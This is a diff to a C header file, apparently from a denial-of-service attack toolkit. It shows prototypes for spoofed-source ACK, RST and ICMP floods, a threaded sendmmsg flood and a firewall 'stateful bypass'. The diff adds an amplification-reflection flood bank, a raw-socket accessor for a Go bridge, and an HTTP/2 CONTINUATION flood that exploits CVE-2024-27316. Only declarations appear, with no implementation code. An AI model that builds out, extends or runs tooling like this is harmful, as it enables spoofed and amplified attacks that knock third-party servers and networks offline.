@@ -85,6 +85,9 @@ EXPORT int  ack_flood(uint32_t target, uint16_t port, uint32_t spoof, int count,
 EXPORT int  rst_flood(uint32_t target, uint16_t port, uint32_t spoof, int count, int delay);
 EXPORT int  icmp_flood(uint32_t target, uint32_t spoof, int count, int delay);
 
+/* Socket accessor (for Go bridge) */
+EXPORT int get_raw_socket(void);
+
 /* Multi-threaded batched sendmmsg flood */
 EXPORT int  start_batch_flood(uint32_t target_ip, uint16_t target_port, int method, int workers, int size, int duration_sec);
 EXPORT int  stop_batch_flood(void);
@@ -155,6 +158,18 @@ EXPORT void             stats_snapshot(uint64_t *total_sent, uint64_t *total_byt
 EXPORT void             stats_reset(void);
 EXPORT time_t           stats_elapsed(void);
 EXPORT void             stats_format_json(char *buf, int buf_size);
+
+/* Amplification Bank */
+EXPORT int  amp_bank_init(int sock, uint32_t target_ip, uint16_t target_port);
+EXPORT int  amp_bank_flood(int sock, int protos, int packets);
+EXPORT int  amp_bank_flood_all(int sock, int packets);
+EXPORT const char *amp_bank_protocol_name(int idx);
+EXPORT int  amp_bank_protocol_factor(int idx);
+EXPORT int  amp_bank_count(void);
+EXPORT int  amp_bank_protocol_port(int idx);
+
+/* H2 CONTINUATION flood (CVE-2024-27316) */
+EXPORT int  h2_continuation_loop(uint32_t target_ip, uint16_t target_port, uint32_t spoof_ip, int streams, int duration_sec);
 
 /* Stateful bypass */
 EXPORT int  bypass_init_handshake(uint32_t target_ip, uint16_t target_port, uint32_t spoof_ip, int use_listen, uint32_t *seq_out, uint16_t *src_port_out);
